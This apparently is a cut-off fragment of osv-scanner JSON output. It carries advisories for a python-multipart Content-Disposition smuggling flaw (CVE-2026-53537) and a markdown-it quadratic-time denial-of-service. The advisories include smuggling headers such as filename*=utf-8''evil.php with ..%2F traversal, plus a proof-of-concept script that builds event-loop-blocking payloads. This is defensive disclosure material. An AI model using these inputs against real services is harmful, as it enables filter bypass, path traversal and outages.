              "fullDescription": {
                "markdown": "### Summary\n\n`parse_options_header` parsed `Content-Disposition` (and `Content-Type`) headers with [`email.message.Message`](https://docs.python.org/3/library/email.compat32-message.html#email.message.Message), which transparently applies [RFC 2231](https://datatracker.ietf.org/doc/html/rfc2231)/[5987](https://datatracker.ietf.org/doc/html/rfc5987) decoding. The extended parameter syntax (`filename*=charset'lang'value`, `name*=...`, and the `filename*0`/`filename*1` continuation form) is decoded and surfaced under the bare `filename`/`name` key, and overrides the plain parameter when both are present. [RFC 7578 §4.2](https://datatracker.ietf.org/doc/html/rfc7578#section-4.2) explicitly forbids the `filename*` form in `multipart/form-data`.\n\nComponents that follow RFC 7578, or that do not implement RFC 2231/5987 decoding for `multipart/form-data` (WAFs, proxies, gateways), may interpret such a header differently. An attacker can exploit that difference to smuggle a different field name or filename past an upstream inspector to the backend.\n\n### Details\n\nGiven both a plain and an extended parameter, the extended value won. For example:\n\n```\nContent-Disposition: form-data; name=\"comment\"; name*=utf-8''role\n```\n\nAn inspector following RFC 7578 sees the field `comment`, while the returned value was `name=role`. The same applies to filenames:\n\n```\nContent-Disposition: form-data; name=\"upload\"; filename=\"safe.txt\"; filename*=utf-8''evil.php\n```\n\nThe inspector sees `safe.txt`, while the returned value was `filename=evil.php`. Continuation parameters (`filename*0`, `filename*1`, and so on) were likewise reassembled into a `filename` invisible to a plain `filename=` match, and percent encoded sequences in the extended value were decoded (so `..%2F`, `%00`, and similar appeared in the returned filename).\n\nThis affects the high level `parse_options_header`, `FormParser`, `create_form_parser`, and `parse_form` APIs, and reaches Starlette/FastAPI through `request.form()`, where the smuggled value is exposed as the form field name or [`UploadFile.filename`](https://www.starlette.io/requests/#request-files).\n\n### Impact\n\nThis is an interpretation conflict ([CWE-436](https://cwe.mitre.org/data/definitions/436.html)) with other `multipart/form-data` parsers. An attacker able to submit `multipart/form-data` can present a different field name or filename to an upstream body inspecting component than the one delivered to the application. Concrete consequences depend on how the application uses these values, and may include bypassing a field name or filename based access/upload control, or, for an application that builds filesystem paths from the parsed filename without sanitization, path traversal via decoded `..%2F` sequences. Decoded control bytes such as `%00` can likewise cause confusion between an upstream validator and the backend. The `File` class applies `os.path.basename`, so file writing through it is not directly affected.\n\n### Mitigation\n\nUpgrade to `python-multipart` `0.0.30` or later, which ignores RFC 2231/5987 extended parameters (`name*`, `filename*`, and their continuations) so the plain `name`/`filename` parameter remains authoritative. RFC 7578 §4.2 forbids `filename*` for `multipart/form-data`; `name*` and the continuation forms are dropped for the same reason, since they are not valid `multipart/form-data` parameters either.",
                "text": "### Summary\n\n`parse_options_header` parsed `Content-Disposition` (and `Content-Type`) headers with [`email.message.Message`](https://docs.python.org/3/library/email.compat32-message.html#email.message.Message), which transparently applies [RFC 2231](https://datatracker.ietf.org/doc/html/rfc2231)/[5987](https://datatracker.ietf.org/doc/html/rfc5987) decoding. The extended parameter syntax (`filename*=charset'lang'value`, `name*=...`, and the `filename*0`/`filename*1` continuation form) is decoded and surfaced under the bare `filename`/`name` key, and overrides the plain parameter when both are present. [RFC 7578 §4.2](https://datatracker.ietf.org/doc/html/rfc7578#section-4.2) explicitly forbids the `filename*` form in `multipart/form-data`.\n\nComponents that follow RFC 7578, or that do not implement RFC 2231/5987 decoding for `multipart/form-data` (WAFs, proxies, gateways), may interpret such a header differently. An attacker can exploit that difference to smuggle a different field name or filename past an upstream inspector to the backend.\n\n### Details\n\nGiven both a plain and an extended parameter, the extended value won. For example:\n\n```\nContent-Disposition: form-data; name=\"comment\"; name*=utf-8''role\n```\n\nAn inspector following RFC 7578 sees the field `comment`, while the returned value was `name=role`. The same applies to filenames:\n\n```\nContent-Disposition: form-data; name=\"upload\"; filename=\"safe.txt\"; filename*=utf-8''evil.php\n```\n\nThe inspector sees `safe.txt`, while the returned value was `filename=evil.php`. Continuation parameters (`filename*0`, `filename*1`, and so on) were likewise reassembled into a `filename` invisible to a plain `filename=` match, and percent encoded sequences in the extended value were decoded (so `..%2F`, `%00`, and similar appeared in the returned filename).\n\nThis affects the high level `parse_options_header`, `FormParser`, `create_form_parser`, and `parse_form` APIs, and reaches Starlette/FastAPI through `request.form()`, where the smuggled value is exposed as the form field name or [`UploadFile.filename`](https://www.starlette.io/requests/#request-files).\n\n### Impact\n\nThis is an interpretation conflict ([CWE-436](https://cwe.mitre.org/data/definitions/436.html)) with other `multipart/form-data` parsers. An attacker able to submit `multipart/form-data` can present a different field name or filename to an upstream body inspecting component than the one delivered to the application. Concrete consequences depend on how the application uses these values, and may include bypassing a field name or filename based access/upload control, or, for an application that builds filesystem paths from the parsed filename without sanitization, path traversal via decoded `..%2F` sequences. Decoded control bytes such as `%00` can likewise cause confusion between an upstream validator and the backend. The `File` class applies `os.path.basename`, so file writing through it is not directly affected.\n\n### Mitigation\n\nUpgrade to `python-multipart` `0.0.30` or later, which ignores RFC 2231/5987 extended parameters (`name*`, `filename*`, and their continuations) so the plain `name`/`filename` parameter remains authoritative. RFC 7578 §4.2 forbids `filename*` for `multipart/form-data`; `name*` and the continuation forms are dropped for the same reason, since they are not valid `multipart/form-data` parameters either."
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-53537](https://osv.dev/CVE-2026-53537)**\n(Also published as: [PYSEC-2026-3041](https://osv.dev/PYSEC-2026-3041), [GHSA-vffw-93wf-4j4q](https://osv.dev/GHSA-vffw-93wf-4j4q), ).\n\n## [PYSEC-2026-3041](https://osv.dev/PYSEC-2026-3041)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e `parse_options_header` parsed `Content-Disposition` (and `Content-Type`) headers with [`email.message.Message`](https://docs.python.org/3/library/email.compat32-message.html#email.message.Message), which transparently applies [RFC 2231](https://datatracker.ietf.org/doc/html/rfc2231)/[5987](https://datatracker.ietf.org/doc/html/rfc5987) decoding. The extended parameter syntax (`filename*=charset'lang'value`, `name*=...`, and the `filename*0`/`filename*1` continuation form) is decoded and surfaced under the bare `filename`/`name` key, and overrides the plain parameter when both are present. [RFC 7578 §4.2](https://datatracker.ietf.org/doc/html/rfc7578#section-4.2) explicitly forbids the `filename*` form in `multipart/form-data`.\n\u003e \n\u003e Components that follow RFC 7578, or that do not implement RFC 2231/5987 decoding for `multipart/form-data` (WAFs, proxies, gateways), may interpret such a header differently. An attacker can exploit that difference to smuggle a different field name or filename past an upstream inspector to the backend.\n\u003e \n\u003e ### Details\n\u003e \n\u003e Given both a plain and an extended parameter, the extended value won. For example:\n\u003e \n\u003e ```\n\u003e Content-Disposition: form-data; name=\"comment\"; name*=utf-8''role\n\u003e ```\n\u003e \n\u003e An inspector following RFC 7578 sees the field `comment`, while the returned value was `name=role`. The same applies to filenames:\n\u003e \n\u003e ```\n\u003e Content-Disposition: form-data; name=\"upload\"; filename=\"safe.txt\"; filename*=utf-8''evil.php\n\u003e ```\n\u003e \n\u003e The inspector sees `safe.txt`, while the returned value was `filename=evil.php`. Continuation parameters (`filename*0`, `filename*1`, and so on) were likewise reassembled into a `filename` invisible to a plain `filename=` match, and percent encoded sequences in the extended value were decoded (so `..%2F`, `%00`, and similar appeared in the returned filename).\n\u003e \n\u003e This affects the high level `parse_options_header`, `FormParser`, `create_form_parser`, and `parse_form` APIs, and reaches Starlette/FastAPI through `request.form()`, where the smuggled value is exposed as the form field name or [`UploadFile.filename`](https://www.starlette.io/requests/#request-files).\n\u003e \n\u003e ### Impact\n\u003e \n\u003e This is an interpretation conflict ([CWE-436](https://cwe.mitre.org/data/definitions/436.html)) with other `multipart/form-data` parsers. An attacker able to submit `multipart/form-data` can present a different field name or filename to an upstream body inspecting component than the one delivered to the application. Concrete consequences depend on how the application uses these values, and may include bypassing a field name or filename based access/upload control, or, for an application that builds filesystem paths from the parsed filename without sanitization, path traversal via decoded `..%2F` sequences. Decoded control bytes such as `%00` can likewise cause confusion between an upstream validator and the backend. The `File` class applies `os.path.basename`, so file writing through it is not directly affected.\n\u003e \n\u003e ### Mitigation\n\u003e \n\u003e Upgrade to `python-multipart` `0.0.30` or later, which ignores RFC 2231/5987 extended parameters (`name*`, `filename*`, and their continuations) so the plain `name`/`filename` parameter remains authoritative. RFC 7578 §4.2 forbids `filename*` for `multipart/form-data`; `name*` and the continuation forms are dropped for the same reason, since they are not valid `multipart/form-data` parameters either.\n\n\u003c/details\u003e\n\n## [GHSA-vffw-93wf-4j4q](https://osv.dev/GHSA-vffw-93wf-4j4q)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e `parse_options_header` parsed `Content-Disposition` (and `Content-Type`) headers with [`email.message.Message`](https://docs.python.org/3/library/email.compat32-message.html#email.message.Message), which transparently applies [RFC 2231](https://datatracker.ietf.org/doc/html/rfc2231)/[5987](https://datatracker.ietf.org/doc/html/rfc5987) decoding. The extended parameter syntax (`filename*=charset'lang'value`, `name*=...`, and the `filename*0`/`filename*1` continuation form) is decoded and surfaced under the bare `filename`/`name` key, and overrides the plain parameter when both are present. [RFC 7578 §4.2](https://datatracker.ietf.org/doc/html/rfc7578#section-4.2) explicitly forbids the `filename*` form in `multipart/form-data`.\n\u003e \n\u003e Components that follow RFC 7578, or that do not implement RFC 2231/5987 decoding for `multipart/form-data` (WAFs, proxies, gateways), may interpret such a header differently. An attacker can exploit that difference to smuggle a different field name or filename past an upstream inspector to the backend.\n\u003e \n\u003e ### Details\n\u003e \n\u003e Given both a plain and an extended parameter, the extended value won. For example:\n\u003e \n\u003e ```\n\u003e Content-Disposition: form-data; name=\"comment\"; name*=utf-8''role\n\u003e ```\n\u003e \n\u003e An inspector following RFC 7578 sees the field `comment`, while the returned value was `name=role`. The same applies to filenames:\n\u003e \n\u003e ```\n\u003e Content-Disposition: form-data; name=\"upload\"; filename=\"safe.txt\"; filename*=utf-8''evil.php\n\u003e ```\n\u003e \n\u003e The inspector sees `safe.txt`, while the returned value was `filename=evil.php`. Continuation parameters (`filename*0`, `filename*1`, and so on) were likewise reassembled into a `filename` invisible to a plain `filename=` match, and percent encoded sequences in the extended value were decoded (so `..%2F`, `%00`, and similar appeared in the returned filename).\n\u003e \n\u003e This affects the high level `parse_options_header`, `FormParser`, `create_form_parser`, and `parse_form` APIs, and reaches Starlette/FastAPI through `request.form()`, where the smuggled value is exposed as the form field name or [`UploadFile.filename`](https://www.starlette.io/requests/#request-files).\n\u003e \n\u003e ### Impact\n\u003e \n\u003e This is an interpretation conflict ([CWE-436](https://cwe.mitre.org/data/definitions/436.html)) with other `multipart/form-data` parsers. An attacker able to submit `multipart/form-data` can present a different field name or filename to an upstream body inspecting component than the one delivered to the application. Concrete consequences depend on how the application uses these values, and may include bypassing a field name or filename based access/upload control, or, for an application that builds filesystem paths from the parsed filename without sanitization, path traversal via decoded `..%2F` sequences. Decoded control bytes such as `%00` can likewise cause confusion between an upstream validator and the backend. The `File` class applies `os.path.basename`, so file writing through it is not directly affected.\n\u003e \n\u003e ### Mitigation\n\u003e \n\u003e Upgrade to `python-multipart` `0.0.30` or later, which ignores RFC 2231/5987 extended parameters (`name*`, `filename*`, and their continuations) so the plain `name`/`filename` parameter remains authoritative. RFC 7578 §4.2 forbids `filename*` for `multipart/form-data`; `name*` and the continuation forms are dropped for the same reason, since they are not valid `multipart/form-data` parameters either.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/poetry.lock | python-multipart | 0.0.20 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-vffw-93wf-4j4q | python-multipart | 0.0.30 |\n| PYSEC-2026-3041 | python-multipart | 0.0.30 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-53537\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-53537](https://osv.dev/CVE-2026-53537)**\n(Also published as: [PYSEC-2026-3041](https://osv.dev/PYSEC-2026-3041), [GHSA-vffw-93wf-4j4q](https://osv.dev/GHSA-vffw-93wf-4j4q), ).\n\n## [PYSEC-2026-3041](https://osv.dev/PYSEC-2026-3041)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e `parse_options_header` parsed `Content-Disposition` (and `Content-Type`) headers with [`email.message.Message`](https://docs.python.org/3/library/email.compat32-message.html#email.message.Message), which transparently applies [RFC 2231](https://datatracker.ietf.org/doc/html/rfc2231)/[5987](https://datatracker.ietf.org/doc/html/rfc5987) decoding. The extended parameter syntax (`filename*=charset'lang'value`, `name*=...`, and the `filename*0`/`filename*1` continuation form) is decoded and surfaced under the bare `filename`/`name` key, and overrides the plain parameter when both are present. [RFC 7578 §4.2](https://datatracker.ietf.org/doc/html/rfc7578#section-4.2) explicitly forbids the `filename*` form in `multipart/form-data`.\n\u003e \n\u003e Components that follow RFC 7578, or that do not implement RFC 2231/5987 decoding for `multipart/form-data` (WAFs, proxies, gateways), may interpret such a header differently. An attacker can exploit that difference to smuggle a different field name or filename past an upstream inspector to the backend.\n\u003e \n\u003e ### Details\n\u003e \n\u003e Given both a plain and an extended parameter, the extended value won. For example:\n\u003e \n\u003e ```\n\u003e Content-Disposition: form-data; name=\"comment\"; name*=utf-8''role\n\u003e ```\n\u003e \n\u003e An inspector following RFC 7578 sees the field `comment`, while the returned value was `name=role`. The same applies to filenames:\n\u003e \n\u003e ```\n\u003e Content-Disposition: form-data; name=\"upload\"; filename=\"safe.txt\"; filename*=utf-8''evil.php\n\u003e ```\n\u003e \n\u003e The inspector sees `safe.txt`, while the returned value was `filename=evil.php`. Continuation parameters (`filename*0`, `filename*1`, and so on) were likewise reassembled into a `filename` invisible to a plain `filename=` match, and percent encoded sequences in the extended value were decoded (so `..%2F`, `%00`, and similar appeared in the returned filename).\n\u003e \n\u003e This affects the high level `parse_options_header`, `FormParser`, `create_form_parser`, and `parse_form` APIs, and reaches Starlette/FastAPI through `request.form()`, where the smuggled value is exposed as the form field name or [`UploadFile.filename`](https://www.starlette.io/requests/#request-files).\n\u003e \n\u003e ### Impact\n\u003e \n\u003e This is an interpretation conflict ([CWE-436](https://cwe.mitre.org/data/definitions/436.html)) with other `multipart/form-data` parsers. An attacker able to submit `multipart/form-data` can present a different field name or filename to an upstream body inspecting component than the one delivered to the application. Concrete consequences depend on how the application uses these values, and may include bypassing a field name or filename based access/upload control, or, for an application that builds filesystem paths from the parsed filename without sanitization, path traversal via decoded `..%2F` sequences. Decoded control bytes such as `%00` can likewise cause confusion between an upstream validator and the backend. The `File` class applies `os.path.basename`, so file writing through it is not directly affected.\n\u003e \n\u003e ### Mitigation\n\u003e \n\u003e Upgrade to `python-multipart` `0.0.30` or later, which ignores RFC 2231/5987 extended parameters (`name*`, `filename*`, and their continuations) so the plain `name`/`filename` parameter remains authoritative. RFC 7578 §4.2 forbids `filename*` for `multipart/form-data`; `name*` and the continuation forms are dropped for the same reason, since they are not valid `multipart/form-data` parameters either.\n\n\u003c/details\u003e\n\n## [GHSA-vffw-93wf-4j4q](https://osv.dev/GHSA-vffw-93wf-4j4q)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e `parse_options_header` parsed `Content-Disposition` (and `Content-Type`) headers with [`email.message.Message`](https://docs.python.org/3/library/email.compat32-message.html#email.message.Message), which transparently applies [RFC 2231](https://datatracker.ietf.org/doc/html/rfc2231)/[5987](https://datatracker.ietf.org/doc/html/rfc5987) decoding. The extended parameter syntax (`filename*=charset'lang'value`, `name*=...`, and the `filename*0`/`filename*1` continuation form) is decoded and surfaced under the bare `filename`/`name` key, and overrides the plain parameter when both are present. [RFC 7578 §4.2](https://datatracker.ietf.org/doc/html/rfc7578#section-4.2) explicitly forbids the `filename*` form in `multipart/form-data`.\n\u003e \n\u003e Components that follow RFC 7578, or that do not implement RFC 2231/5987 decoding for `multipart/form-data` (WAFs, proxies, gateways), may interpret such a header differently. An attacker can exploit that difference to smuggle a different field name or filename past an upstream inspector to the backend.\n\u003e \n\u003e ### Details\n\u003e \n\u003e Given both a plain and an extended parameter, the extended value won. For example:\n\u003e \n\u003e ```\n\u003e Content-Disposition: form-data; name=\"comment\"; name*=utf-8''role\n\u003e ```\n\u003e \n\u003e An inspector following RFC 7578 sees the field `comment`, while the returned value was `name=role`. The same applies to filenames:\n\u003e \n\u003e ```\n\u003e Content-Disposition: form-data; name=\"upload\"; filename=\"safe.txt\"; filename*=utf-8''evil.php\n\u003e ```\n\u003e \n\u003e The inspector sees `safe.txt`, while the returned value was `filename=evil.php`. Continuation parameters (`filename*0`, `filename*1`, and so on) were likewise reassembled into a `filename` invisible to a plain `filename=` match, and percent encoded sequences in the extended value were decoded (so `..%2F`, `%00`, and similar appeared in the returned filename).\n\u003e \n\u003e This affects the high level `parse_options_header`, `FormParser`, `create_form_parser`, and `parse_form` APIs, and reaches Starlette/FastAPI through `request.form()`, where the smuggled value is exposed as the form field name or [`UploadFile.filename`](https://www.starlette.io/requests/#request-files).\n\u003e \n\u003e ### Impact\n\u003e \n\u003e This is an interpretation conflict ([CWE-436](https://cwe.mitre.org/data/definitions/436.html)) with other `multipart/form-data` parsers. An attacker able to submit `multipart/form-data` can present a different field name or filename to an upstream body inspecting component than the one delivered to the application. Concrete consequences depend on how the application uses these values, and may include bypassing a field name or filename based access/upload control, or, for an application that builds filesystem paths from the parsed filename without sanitization, path traversal via decoded `..%2F` sequences. Decoded control bytes such as `%00` can likewise cause confusion between an upstream validator and the backend. The `File` class applies `os.path.basename`, so file writing through it is not directly affected.\n\u003e \n\u003e ### Mitigation\n\u003e \n\u003e Upgrade to `python-multipart` `0.0.30` or later, which ignores RFC 2231/5987 extended parameters (`name*`, `filename*`, and their continuations) so the plain `name`/`filename` parameter remains authoritative. RFC 7578 §4.2 forbids `filename*` for `multipart/form-data`; `name*` and the continuation forms are dropped for the same reason, since they are not valid `multipart/form-data` parameters either.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/poetry.lock | python-multipart | 0.0.20 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-vffw-93wf-4j4q | python-multipart | 0.0.30 |\n| PYSEC-2026-3041 | python-multipart | 0.0.30 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-53537\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
              "id": "CVE-2026-53537",
              "name": "CVE-2026-53537",
              "properties": {
                "security-severity": "3.7"
              },
              "relationships": [],
              "shortDescription": {
                "markdown": "CVE-2026-53537: python-multipart: Content-Disposition parameter smuggling via RFC 2231/5987 extended parameters",
                "text": "CVE-2026-53537: python-multipart: Content-Disposition parameter smuggling via RFC 2231/5987 extended parameters"
              }
            },
            {
              "deprecatedIds": [
                "CVE-2026-111766",
                "GHSA-vfgh-jcmw-g37q"
              ],
              "fullDescription": {
                "markdown": "### Summary\n\nWith `html: true`, markdown-it takes quadratic time to parse repeated unterminated HTML constructs inside a paragraph. This affects HTML comments (`\u003c!--`), processing instructions (`\u003c?`), declarations (`\u003c!A`), and CDATA sections (`\u003c![CDATA[`).\n\nAn attacker-controlled input of a few hundred kilobytes can block the Node.js event loop for seconds or tens of seconds. The default configuration has HTML disabled, but the `commonmark` preset enables it.\n\nThe issue was reported against the published `markdown-it@15.0.2` package on Node.js 20 and reproduced on the current source with Node.js 24.16.0.\n\n### Details\n\n`src/rules_inline/text.ts` treats `\u003c` as a terminator, causing the inline parser to attempt the HTML rule at successive HTML construct openers.\n\nWith HTML enabled, `src/rules_inline/html_inline.ts` applies an anchored regular expression to the remaining input:\n\n```js\nconst match = state.src.slice(pos).match(HTML_TAG_RE)\n```\n\nThe comment, processing instruction, declaration, and CDATA alternatives in `src/common/html_re.ts` scan the remaining input for their respective terminators: `--\u003e`, `?\u003e`, `\u003e`, and `]]\u003e`.\n\nWhen the terminator is absent, matching fails. Parsing eventually reaches the next opener and scans an overlapping suffix again. Repeating this across the paragraph produces quadratic total work. For these inputs, the problem is repeated scanning across separate matches.\n\nThe payload must reach inline parsing. Prefixing it with `x ` keeps it inside a paragraph. Starting a line directly with one of these constructs instead invokes HTML block parsing, which does not exhibit the same repeated inline scans for these payloads.\n\nThe existing `unclosed \u003c!--` test in `test/markdown-it/pathological.test.mjs` already contains a reproducer:\n\n```js\n'\u003c/' + '\u003c!--'.repeat(100000)\n```\n\nHowever, it runs with default options, where HTML is disabled.\n\nA fix should avoid repeated searches for absent terminators across all four affected alternatives, for example by caching failed searches on the inline state. Fixing only the comment alternative leaves the other three cases affected. Regression coverage should exercise all four with `html: true`.\n\nThe original report was submitted by [@JarLob](https://github.com/JarLob). It credits the [GitHub Security Lab Taskflow Agent](https://github.com/GitHubSecurityLab/seclab-taskflow-agent) as part of the [GitHub Secure Open Source Fund](https://github.com/open-source/github-secure-open-source-fund).\n\n### Proof of concept\n\nInstall the affected package in an empty directory:\n\n```sh\nnpm install markdown-it@15.0.2\n```\n\nSave the following as `poc.mjs` and run `node poc.mjs`:\n\n```js\nimport MarkdownIt from 'markdown-it'\nimport { performance } from 'node:perf_hooks'\n\nconst mdHtml = new MarkdownIt({ html: true })\nconst mdDefault = new MarkdownIt()\nconst sizes = [8000, 16000, 32000, 64000]\n\nfunction measure(md, src) {\n  const start = performance.now()\n  md.render(src)\n  return (performance.now() - start).toFixed(1)\n}\n\nconst variants = {\n  comment: '\u003c!--',\n  processing: '\u003c?x',\n  declaration: '\u003c!A',\n  cdata: '\u003c![CDATA['\n}\n\nfor (const [name, opener] of Object.entries(variants)) {\n  console.log(`\\n${name}`)\n  for (const n of sizes) {\n    const src = 'x ' + opener.repeat(n)\n    console.log({\n      n,\n      bytes: Buffer.byteLength(src),\n      ms: measure(mdHtml, src)\n    })\n  }\n}\n\nconst n = sizes.at(-1)\nconst controls = {\n  'HTML disabled': [mdDefault, 'x ' + '\u003c!--'.repeat(n)],\n  'Closed comments': [mdHtml, 'x ' + '\u003c!----\u003e'.repeat(n)],\n  'HTML block': [mdHtml, '\u003c!--'.repeat(n)],\n  'Plain text': [mdHtml, 'x ' + 'abcd'.repeat(n)]\n}\n\nfor (const [name, [md, src]] of Object.entries(controls)) {\n  console.log({ control: name, ms: measure(md, src) })\n}\n\nconst repoPayload = '\u003c/' + '\u003c!--'.repeat(100000)\nconsole.log({\n  payload: 'Existing pathological test',\n  htmlFalseMs: measure(mdDefault, repoPayload),\n  htmlTrueMs: measure(mdHtml, repoPayload)\n})\n```\n\nMeasurements from the original report on `markdown-it@15.0.2`, Node.js 20:\n\n| Construct | 8,000 repetitions | 64,000 repetitions |\n| --- | ---: | ---: |\n| Comment | 170 ms | 8,799 ms |\n| Processing instruction | 26 ms | 1,566 ms |\n| Declaration | 93 ms | 5,628 ms |\n| CDATA | 119 ms | 4,179 ms |\n\nAn eightfold increase in repetitions produces approximately 35–60 times the execution time, consistent with quadratic growth becoming dominant.\n\nFor the comment payload at 64,000 repetitions:\n\n- HTML disabled: 25 ms.\n- Closed comments: 29 ms.\n- Payload at the start of an HTML block: 1 ms.\n- Plain text: 1 ms.\n\nThe existing pathological-test payload with 100,000 comment openers took 33 ms with HTML disabled and 21,030 ms with HTML enabled. A separate comment payload with 128,000 repetitions, approximately 500 KiB, took 32,847 ms.\n\nExact timings depend on the runtime and hardware.\n\n### Impact\n\nThis is an availability issue affecting applications that render attacker-controlled Markdown with `html: true`, including applications using the `commonmark` preset.\n\nOn Node.js, a synchronous `render()` call can occupy a CPU core and block the event loop for seconds or tens of seconds, delaying other requests handled by the same process. Repeated submissions can cause denial of service. Browser applications can similarly become unresponsive when rendering on the main thread.\n\nSanitizing the generated HTML afterwards does not prevent the issue because the expensive processing occurs during Markdown rendering.\n\nThe default configuration, with HTML disabled, is unaffected by these payloads. Disabling HTML or limiting input size can reduce exposure while a fix is prepared.\n\nThe reported affected release is `15.0.2`; the full affected version range has not been established.",
                "text": "### Summary\n\nWith `html: true`, markdown-it takes quadratic time to parse repeated unterminated HTML constructs inside a paragraph. This affects HTML comments (`\u003c!--`), processing instructions (`\u003c?`), declarations (`\u003c!A`), and CDATA sections (`\u003c![CDATA[`).\n\nAn attacker-controlled input of a few hundred kilobytes can block the Node.js event loop for seconds or tens of seconds. The default configuration has HTML disabled, but the `commonmark` preset enables it.\n\nThe issue was reported against the published `markdown-it@15.0.2` package on Node.js 20 and reproduced on the current source with Node.js 24.16.0.\n\n### Details\n\n`src/rules_inline/text.ts` treats `\u003c` as a terminator, causing the inline parser to attempt the HTML rule at successive HTML construct openers.\n\nWith HTML enabled, `src/rules_inline/html_inline.ts` applies an anchored regular expression to the remaining input:\n\n```js\nconst match = state.src.slice(pos).match(HTML_TAG_RE)\n```\n\nThe comment, processing instruction, declaration, and CDATA alternatives in `src/common/html_re.ts` scan the remaining input for their respective terminators: `--\u003e`, `?\u003e`, `\u003e`, and `]]\u003e`.\n\nWhen the terminator is absent, matching fails. Parsing eventually reaches the next opener and scans an overlapping suffix again. Repeating this across the paragraph produces quadratic total work. For these inputs, the problem is repeated scanning across separate matches.\n\nThe payload must reach inline parsing. Prefixing it with `x ` keeps it inside a paragraph. Starting a line directly with one of these constructs instead invokes HTML block parsing, which does not exhibit the same repeated inline scans for these payloads.\n\nThe existing `unclosed \u003c!--` test in `test/markdown-it/pathological.test.mjs` already contains a reproducer:\n\n```js\n'\u003c/' + '\u003c!--'.repeat(100000)\n```\n\nHowever, it runs with default options, where HTML is disabled.\n\nA fix should avoid repeated searches for absent terminators across all four affected alternatives, for example by caching failed searches on the inline state. Fixing only the comment alternative leaves the other three cases affected. Regression coverage should exercise all four with `html: true`.\n\nThe original report was submitted by [@JarLob](https://github.com/JarLob). It credits the [GitHub Security Lab Taskflow Agent](https://github.com/GitHubSecurityLab/seclab-taskflow-agent) as part of the [GitHub Secure Open Source Fund](https://github.com/open-source/github-secure-open-source-fund).\n\n### Proof of concept\n\nInstall the affected package in an empty directory:\n\n```sh\nnpm install markdown-it@15.0.2\n```\n\nSave the following as `poc.mjs` and run `node poc.mjs`:\n\n```js\nimport MarkdownIt from 'markdown-it'\nimport { performance } from 'node:perf_hooks'\n\nconst mdHtml = new MarkdownIt({ html: true })\nconst mdDefault = new MarkdownIt()\nconst sizes = [8000, 16000, 32000, 64000]\n\nfunction measure(md, src) {\n  const start = performance.now()\n  md.render(src)\n  return (performance.now() - start).toFixed(1)\n}\n\nconst variants = {\n  comment: '\u003c!--',\n  processing: '\u003c?x',\n  declaration: '\u003c!A',\n  cdata: '\u003c![CDATA['\n}\n\nfor (const [name, opener] of Object.entries(variants)) {\n  console.log(`\\n${name}`)\n  for (const n of sizes) {\n    const src = 'x ' + opener.repeat(n)\n    console.log({\n      n,\n      bytes: Buffer.byteLength(src),\n      ms: measure(mdHtml, src)\n    })\n  }\n}\n\nconst n = sizes.at(-1)\nconst controls = {\n  'HTML disabled': [mdDefault, 'x ' + '\u003c!--'.repeat(n)],\n  'Closed comments': [mdHtml, 'x ' + '\u003c!----\u003e'.repeat(n)],\n  'HTML block': [mdHtml, '\u003c!--'.repeat(n)],\n  'Plain text': [mdHtml, 'x ' + 'abcd'.repeat(n)]\n}\n\nfor (const [name, [md, src]] of Object.entries(controls)) {\n  console.log({ control: name, ms: measure(md, src) })\n}\n\nconst repoPayload = '\u003c/' + '\u003c!--'.repeat(100000)\nconsole.log({\n  payload: 'Existing pathological test',\n  htmlFalseMs: measure(mdDefault, repoPayload),\n  htmlTrueMs: measure(mdHtml, repoPayload)\n})\n```\n\nMeasurements from the original report on `markdown-it@15.0.2`, Node.js 20:\n\n| Construct | 8,000 repetitions | 64,000 repetitions |\n| --- | ---: | ---: |\n| Comment | 170 ms | 8,799 ms |\n| Processing instruction | 26 ms | 1,566 ms |\n| Declaration | 93 ms | 5,628 ms |\n| CDATA | 119 ms | 4,179 ms |\n\nAn eightfold increase in repetitions produces approximately 35–60 times the execution time, consistent with quadratic growth becoming dominant.\n\nFor the comment payload at 64,000 repetitions:\n\n- HTML disabled: 25 ms.\n- Closed comments: 29 ms.\n- Payload at the start of an HTML block: 1 ms.\n- Plain text: 1 ms.\n\nThe existing pathological-test payload with 100,000 comment openers took 33 ms with HTML disabled and 21,030 ms with HTML enabled. A separate comment payload with 128,000 repetitions, approximately 500 KiB, took 32,847 ms.\n\nExact timings depend on the runtime and hardware.\n\n### Impact\n\nThis is an availability issue affecting applications that render attacker-controlled Markdown with `html: 